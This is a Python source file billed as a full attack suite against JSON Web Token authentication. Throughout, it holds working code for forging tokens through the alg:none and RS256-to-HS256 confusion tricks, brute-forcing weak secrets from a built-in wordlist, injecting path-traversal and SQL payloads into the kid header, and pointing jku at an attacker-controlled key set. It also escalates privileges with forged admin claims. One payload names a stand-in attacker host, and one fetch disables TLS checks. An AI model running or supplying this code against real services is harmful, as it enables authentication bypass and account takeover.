"""
jwt_attack.py
=============
Full JWT attack suite:
  - alg:none attack (remove signature)
  - RS256 → HS256 confusion attack (sign with public key as HMAC secret)
  - Weak secret brute-force (dictionary + common secrets)
  - kid (Key ID) injection (path traversal, SQL injection in kid)
  - jku/x5u header injection (point to attacker-controlled JWKS)
  - x5c injection (embed self-signed certificate)
  - nbf/exp manipulation (extend token validity)
  - Null algorithm variants
  - Header parameter injection
  - JWT claim enumeration and analysis
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import string
import time
from dataclasses import dataclass, field
from typing import Dict, Iterator, List, Optional, Tuple


# ---------------------------------------------------------------------------
# JWT primitives
# ---------------------------------------------------------------------------

def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")

def _b64url_decode(s: str) -> bytes:
    pad = 4 - len(s) % 4
    if pad != 4:
        s += "=" * pad
    return base64.urlsafe_b64decode(s)

def _parse_jwt(token: str) -> Tuple[Dict, Dict, str]:
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError(f"Invalid JWT: expected 3 parts, got {len(parts)}")
    header  = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    sig     = parts[2]
    return header, payload, sig

def _build_jwt(header: Dict, payload: Dict, signature: bytes = b"") -> str:
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    s = _b64url_encode(signature)
    return f"{h}.{p}.{s}"

def _hmac_sign(header: Dict, payload: Dict, secret: bytes, alg: str = "HS256") -> str:
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    digest_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    digest = digest_map.get(alg, hashlib.sha256)
    sig = hmac.new(secret, signing_input, digest).digest()
    return f"{h}.{p}.{_b64url_encode(sig)}"

def _verify_hmac(token: str, secret: bytes, alg: str = "HS256") -> bool:
    parts = token.split(".")
    if len(parts) != 3:
        return False
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    digest_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    digest = digest_map.get(alg, hashlib.sha256)
    expected = hmac.new(secret, signing_input, digest).digest()
    try:
        actual = _b64url_decode(parts[2])
        return hmac.compare_digest(expected, actual)
    except Exception:
        return False


# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------

@dataclass
class JWTAnalysis:
    token:        str
    header:       Dict
    payload:      Dict
    algorithm:    str
    kid:          Optional[str] = None
    jku:          Optional[str] = None
    x5u:          Optional[str] = None
    exp:          Optional[int] = None
    iat:          Optional[int] = None
    nbf:          Optional[int] = None
    sub:          Optional[str] = None
    iss:          Optional[str] = None
    is_expired:   bool = False
    issues:       List[str] = field(default_factory=list)
    claims:       Dict = field(default_factory=dict)

@dataclass
class JWTAttackResult:
    attack:       str
    success:      bool
    forged_token: Optional[str] = None
    cracked_key:  Optional[str] = None
    evidence:     str = ""
    details:      Dict = field(default_factory=dict)


# ---------------------------------------------------------------------------
# JWT Analyzer
# ---------------------------------------------------------------------------

class JWTAnalyzer:
    def analyze(self, token: str) -> JWTAnalysis:
        header, payload, sig = _parse_jwt(token)
        now = int(time.time())

        analysis = JWTAnalysis(
            token=token, header=header, payload=payload,
            algorithm=header.get("alg", "unknown"),
            kid=header.get("kid"),
            jku=header.get("jku"),
            x5u=header.get("x5u"),
            exp=payload.get("exp"),
            iat=payload.get("iat"),
            nbf=payload.get("nbf"),
            sub=payload.get("sub"),
            iss=payload.get("iss"),
            claims=payload,
        )

        if analysis.exp and analysis.exp < now:
            analysis.is_expired = True
            analysis.issues.append(f"Token expired {now - analysis.exp}s ago")

        if analysis.algorithm in ("none", "None", "NONE"):
            analysis.issues.append("CRITICAL: algorithm=none — no signature verification!")

        if analysis.algorithm.startswith("HS"):
            analysis.issues.append(f"Symmetric algorithm {analysis.algorithm} — secret brute-force possible")

        if analysis.kid:
            if "/" in analysis.kid or ".." in analysis.kid:
                analysis.issues.append(f"kid contains path chars: {analysis.kid!r} — path traversal possible")
            if "'" in analysis.kid or " " in analysis.kid:
                analysis.issues.append(f"kid may be SQL-injectable: {analysis.kid!r}")

        if analysis.jku:
            analysis.issues.append(f"jku header present ({analysis.jku}) — can point to attacker JWKS")
        if analysis.x5u:
            analysis.issues.append(f"x5u header present ({analysis.x5u}) — can inject attacker cert")

        if not analysis.exp:
            analysis.issues.append("No exp claim — token never expires")
        if not analysis.nbf:
            pass

        return analysis


# ---------------------------------------------------------------------------
# Attack 1: alg:none
# ---------------------------------------------------------------------------

class AlgNoneAttack:
    ALG_NONE_VARIANTS = ["none", "None", "NONE", "nOnE", "nONE", "NoNe"]

    def attack(self, token: str, modify_payload: Optional[Dict] = None) -> List[JWTAttackResult]:
        results = []
        header, payload, _ = _parse_jwt(token)

        if modify_payload:
            payload.update(modify_payload)

        for variant in self.ALG_NONE_VARIANTS:
            forged_header  = {**header, "alg": variant}
            forged = _build_jwt(forged_header, payload, b"")
            results.append(JWTAttackResult(
                attack="alg_none",
                success=True,
                forged_token=forged,
                evidence=f"Forged JWT with alg={variant!r} and empty signature",
                details={"alg_variant": variant},
            ))

        forged_nosig_header = {**header, "alg": "none"}
        parts = token.split(".")
        h = _b64url_encode(json.dumps(forged_nosig_header, separators=(",", ":")).encode())
        p = parts[1]
        results.append(JWTAttackResult(
            attack="alg_none_no_dot",
            success=True,
            forged_token=f"{h}.{p}.",
            evidence="JWT with trailing dot only (no signature bytes)",
        ))
        return results


# ---------------------------------------------------------------------------
# Attack 2: RS256 → HS256 confusion
# ---------------------------------------------------------------------------

class RS256HS256ConfusionAttack:
    """
    If the server accepts HS256 and uses the RS256 public key as the HMAC secret,
    we can forge tokens by signing with the public key material.
    """

    def attack(self, token: str, public_key_pem: str,
               modify_payload: Optional[Dict] = None) -> JWTAttackResult:
        header, payload, _ = _parse_jwt(token)
        if modify_payload:
            payload.update(modify_payload)

        new_header = {**header, "alg": "HS256"}
        if "kid" in new_header:
            del new_header["kid"]

        secret = public_key_pem.encode("utf-8")
        forged = _hmac_sign(new_header, payload, secret, "HS256")

        return JWTAttackResult(
            attack="rs256_hs256_confusion",
            success=True,
            forged_token=forged,
            evidence="RS256→HS256 confusion: HMAC-signed with public key as secret",
            details={"original_alg": header.get("alg"), "forged_alg": "HS256"},
        )

    def attack_with_extracted_key(self, token: str, jwks_url: str,
                                   modify_payload: Optional[Dict] = None) -> Optional[JWTAttackResult]:
        try:
            import urllib.request, ssl, json
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            with urllib.request.urlopen(jwks_url, timeout=5, context=ctx) as r:
                jwks = json.loads(r.read())
            keys = jwks.get("keys", [])
            if not keys:
                return None
            key = keys[0]
            n_b64 = key.get("n", "")
            e_b64 = key.get("e", "")
            if n_b64 and e_b64:
                pem_like = f"-----BEGIN PUBLIC KEY-----\n{n_b64}\n-----END PUBLIC KEY-----\n"
                return self.attack(token, pem_like, modify_payload)
        except Exception:
            return None


# ---------------------------------------------------------------------------
# Attack 3: Weak secret brute-force
# ---------------------------------------------------------------------------

COMMON_JWT_SECRETS = [
    "secret", "password", "12345678", "jwt_secret", "mysecret", "changeme",
    "supersecret", "jwttoken", "token", "key", "privatekey", "secretkey",
    "abc123", "qwerty", "letmein", "admin", "root", "test", "development",
    "production", "staging", "default", "insecure", "hackme", "jwt",
    "jwtpassword", "jwtsecret", "api_secret", "api_key", "app_secret",
    "flask_secret_key", "django_secret_key", "rails_secret", "node_secret",
    "spring_secret", "laravel_key", "php_secret", "express_secret",
    "yourjwtsecret", "yoursecret", "myjwtsecret", "my_secret_key",
    "asdfghjkl", "zxcvbnm", "poiuytrewq", "1234567890", "password123",
    "P@ssw0rd", "Welcome1", "Admin123", "Abc123456", "S3cr3t!",
    "HS256_SECRET", "RS256_KEY", "ES256_KEY", "HMAC_KEY",
    "", "null", "undefined", "none", "false", "true",
    "your-256-bit-secret", "your-384-bit-secret", "your-512-bit-secret",
]


class WeakSecretBruteForce:
    def brute_force(self, token: str, wordlist: Optional[List[str]] = None,
                    wordlist_file: Optional[str] = None) -> Optional[JWTAttackResult]:
        try:
            header, payload, _ = _parse_jwt(token)
        except Exception:
            return None

        alg = header.get("alg", "HS256")
        if not alg.startswith("HS"):
            return None

        candidates: List[str] = list(COMMON_JWT_SECRETS)
        if wordlist:
            candidates.extend(wordlist)
        if wordlist_file:
            try:
                with open(wordlist_file, "r", errors="replace") as f:
                    candidates.extend(line.strip() for line in f)
            except Exception:
                pass

        seen: set = set()
        for secret in candidates:
            if secret in seen:
                continue
            seen.add(secret)
            if _verify_hmac(token, secret.encode("utf-8"), alg):
                return JWTAttackResult(
                    attack="weak_secret_brute_force",
                    success=True,
                    cracked_key=secret,
                    evidence=f"JWT secret cracked: {secret!r} (algorithm: {alg})",
                    details={"algorithm": alg, "secret": secret},
                )
        return None

    def brute_force_generate(self, token: str, charset: str = string.ascii_lowercase,
                              max_length: int = 5) -> Iterator[str]:
        import itertools
        try:
            header, _, _ = _parse_jwt(token)
        except Exception:
            return
        alg = header.get("alg", "HS256")
        for length in range(1, max_length + 1):
            for combo in itertools.product(charset, repeat=length):
                secret = "".join(combo)
                if _verify_hmac(token, secret.encode(), alg):
                    yield secret


# ---------------------------------------------------------------------------
# Attack 4: kid injection
# ---------------------------------------------------------------------------

KID_TRAVERSAL_PAYLOADS = [
    "../../../../../../dev/null",
    "../../../../../../../etc/passwd",
    "../../../../../../proc/self/cmdline",
    "/dev/null",
    "/dev/tcp/attacker.com/4444",
]

KID_SQL_PAYLOADS = [
    "' UNION SELECT 'attacker_key'--",
    "' OR '1'='1",
    "1; DROP TABLE keys--",
    "' UNION SELECT NULL--",
    "attacker_key' OR 1=1--",
    "'; INSERT INTO keys VALUES('k1','attacker_key')--",
]


class KIDInjectionAttack:
    def _sign_with_empty_secret(self, header: Dict, payload: Dict, alg: str = "HS256") -> str:
        return _hmac_sign(header, payload, b"", alg)

    def _sign_with_null_secret(self, header: Dict, payload: Dict, alg: str = "HS256") -> str:
        return _hmac_sign(header, payload, b"\x00", alg)

    def attack_path_traversal(self, token: str, modify_payload: Optional[Dict] = None) -> List[JWTAttackResult]:
        header, payload, _ = _parse_jwt(token)
        if modify_payload:
            payload.update(modify_payload)
        results = []
        for kid_pl in KID_TRAVERSAL_PAYLOADS:
            new_header = {**header, "alg": "HS256", "kid": kid_pl}
            forged = self._sign_with_empty_secret(new_header, payload)
            results.append(JWTAttackResult(
                attack="kid_path_traversal",
                success=True,
                forged_token=forged,
                evidence=f"kid set to {kid_pl!r} — if server reads file contents as key, empty/null key used for signing",
                details={"kid": kid_pl},
            ))
        return results

    def attack_sql_injection(self, token: str, modify_payload: Optional[Dict] = None) -> List[JWTAttackResult]:
        header, payload, _ = _parse_jwt(token)
        if modify_payload:
            payload.update(modify_payload)
        results = []
        for kid_pl in KID_SQL_PAYLOADS:
            new_header = {**header, "alg": "HS256", "kid": kid_pl}
            for secret in [b"", b"\x00", b"attacker_key"]:
                forged = _hmac_sign(new_header, payload, secret, "HS256")
                results.append(JWTAttackResult(
                    attack="kid_sql_injection",
                    success=True,
                    forged_token=forged,
                    evidence=f"kid SQL payload: {kid_pl!r} — signed with secret: {secret!r}",
                    details={"kid": kid_pl, "secret": secret.decode("utf-8", errors="replace")},
                ))
        return results


# ---------------------------------------------------------------------------
# Attack 5: jku / x5u header injection
# ---------------------------------------------------------------------------

JWKS_TEMPLATE = {
    "keys": [{
        "kty": "oct",
        "kid": "phantom_key",
        "k":   _b64url_encode(b"attacker_controlled_secret_key_32b"),
        "alg": "HS256",
        "use": "sig",
    }]
}


class JKUAttack:
    def generate_malicious_jwks(self, secret: bytes = b"attacker_controlled_secret_key_32b") -> Dict:
        return {
            "keys": [{
                "kty": "oct",
                "kid": "phantom_key",
                "k":   _b64url_encode(secret),
                "alg": "HS256",
                "use": "sig",
            }]
        }

    def forge_token(self, token: str, attacker_jwks_url: str,
                    secret: bytes = b"attacker_controlled_secret_key_32b",
                    modify_payload: Optional[Dict] = None) -> JWTAttackResult:
        header, payload, _ = _parse_jwt(token)
        if modify_payload:
            payload.update(modify_payload)

        new_header = {
            **header,
            "alg": "HS256",
            "jku": attacker_jwks_url,
            "kid": "phantom_key",
        }
        forged = _hmac_sign(new_header, payload, secret, "HS256")
        return JWTAttackResult(
            attack="jku_injection",
            success=True,
            forged_token=forged,
            evidence=f"jku set to attacker URL {attacker_jwks_url!r} — if server fetches JWKS from jku, attacker controls key",
            details={"jku": attacker_jwks_url, "jwks": self.generate_malicious_jwks(secret)},
        )


# ---------------------------------------------------------------------------
# Attack 6: Claim manipulation
# ---------------------------------------------------------------------------

class ClaimManipulator:
    def elevate_privileges(self, token: str, secret: Optional[bytes] = None) -> List[JWTAttackResult]:
        header, payload, _ = _parse_jwt(token)
        results = []

        privilege_mutations = [
            {"admin": True},
            {"role": "admin"},
            {"roles": ["admin", "superuser"]},
            {"is_admin": True},
            {"scope": "admin write read delete"},
            {"permissions": ["admin", "read", "write", "delete", "execute"]},
            {"group": "admins"},
            {"user_type": "admin"},
            {"level": 9999},
            {"access": "full"},
        ]

        for mutation in privilege_mutations:
            new_payload = {**payload, **mutation}
            if "exp" in new_payload:
                new_payload["exp"] = int(time.time()) + 86400 * 365

            if secret:
                alg = header.get("alg", "HS256")
                forged = _hmac_sign(header, new_payload, secret, alg)
            else:
                new_header = {**header, "alg": "none"}
                forged = _build_jwt(new_header, new_payload, b"")

            results.append(JWTAttackResult(
                attack="claim_privilege_escalation",
                success=True,
                forged_token=forged,
                evidence=f"Injected privilege claim: {mutation}",
                details={"mutation": mutation},
            ))
        return results

    def extend_expiry(self, token: str, secret: Optional[bytes] = None,
                      years: int = 10) -> JWTAttackResult:
        header, payload, _ = _parse_jwt(token)
        new_payload = {**payload, "exp": int(time.time()) + 86400 * 365 * years}
        if secret:
            alg = header.get("alg", "HS256")
            forged = _hmac_sign(header, new_payload, secret, alg)
        else:
            new_header = {**header, "alg": "none"}
            forged = _build_jwt(new_header, new_payload, b"")
        return JWTAttackResult(
            attack="expiry_extension",
            success=True,
            forged_token=forged,
            evidence=f"Extended token expiry by {years} years",
        )


# ---------------------------------------------------------------------------
# Master JWT Attacker
# ---------------------------------------------------------------------------

class JWTAttacker:
    def __init__(self):
        self.analyzer  = JWTAnalyzer()
        self.alg_none  = AlgNoneAttack()
        self.rs256_hs256 = RS256HS256ConfusionAttack()
        self.weak_brute  = WeakSecretBruteForce()
        self.kid_inject  = KIDInjectionAttack()
        self.jku_attack  = JKUAttack()
        self.claim_manip = ClaimManipulator()

    def full_attack(
        self,
        token:          str,
        wordlist:       Optional[List[str]]     = None,
        wordlist_file:  Optional[str]           = None,
        public_key_pem: Optional[str]           = None,
        attacker_jku:   Optional[str]           = None,
        modify_payload: Optional[Dict]          = None,
        run_brute:      bool                    = True,
    ) -> Dict:
        analysis = self.analyzer.analyze(token)
        results: Dict[str, List] = {
            "analysis": {
                "algorithm":  analysis.algorithm,
                "kid":        analysis.kid,
                "jku":        analysis.jku,
                "exp":        analysis.exp,
                "sub":        analysis.sub,
                "iss":        analysis.iss,
                "is_expired": analysis.is_expired,
                "issues":     analysis.issues,
                "claims":     analysis.claims,
            },
            "attacks": []
        }

        for r in self.alg_none.attack(token, modify_payload):
            results["attacks"].append(r.__dict__)

        if analysis.kid:
            for r in self.kid_inject.attack_path_traversal(token, modify_payload):
                results["attacks"].append(r.__dict__)
            for r in self.kid_inject.attack_sql_injection(token, modify_payload):
                results["attacks"].append(r.__dict__)

        if public_key_pem and analysis.algorithm.startswith("RS"):
            r = self.rs256_hs256.attack(token, public_key_pem, modify_payload)
            results["attacks"].append(r.__dict__)

        if attacker_jku:
            r = self.jku_attack.forge_token(token, attacker_jku, modify_payload=modify_payload)
            results["attacks"].append(r.__dict__)

        if run_brute and analysis.algorithm.startswith("HS"):
            r = self.weak_brute.brute_force(token, wordlist, wordlist_file)
            if r:
                results["attacks"].append(r.__dict__)
                secret = r.cracked_key.encode() if r.cracked_key else None
                for priv_r in self.claim_manip.elevate_privileges(token, secret):
                    results["attacks"].append(priv_r.__dict__)

        results["attacks"].append(self.claim_manip.extend_expiry(token).__dict__)

        return results
